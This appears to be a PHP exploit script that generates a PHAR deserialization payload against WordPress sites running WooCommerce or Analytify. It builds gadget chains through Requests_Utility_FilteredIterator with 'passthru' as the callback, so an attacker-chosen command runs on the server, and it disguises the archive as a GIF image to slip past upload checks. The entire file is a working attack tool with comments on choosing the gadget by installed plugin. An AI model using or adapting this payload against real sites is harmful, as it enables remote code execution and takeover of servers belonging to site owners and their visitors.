<?php

$command = $argv[1];

class ANALYTIFY_Log_Handler_File {
    protected $handles;
    public function __construct() {
        global $command;
        $this->handles = new Requests_Utility_FilteredIterator(array($command), 'passthru');
    }
}

class Requests_Utility_FilteredIterator extends ArrayIterator{
    protected $callback;
    public function __construct($data, $callback) {
        parent::__construct($data);
        $this->callback = $callback;
    }
}

class WC_Log_Handler_File {
    protected $handles;
    public function __construct() {
        global $command;
        $this->handles = new Requests_Utility_FilteredIterator(array($command), 'passthru');
    }
}


@unlink("phar.phar");
$phar = new Phar("phar.phar");
$phar->startBuffering();

// disguise as image
$phar->setStub("GIF89a"."<?php __HALT_COMPILER(); ?>");

// use this if Woocommerce is installed
$o = new WC_Log_Handler_File();

// use this if Analytify is installed
//$o = new ANALYTIFY_Log_Handler_File();

$phar->setMetadata($o);
$phar->addFromString("test.txt", "test");
$phar->stopBuffering();
?>
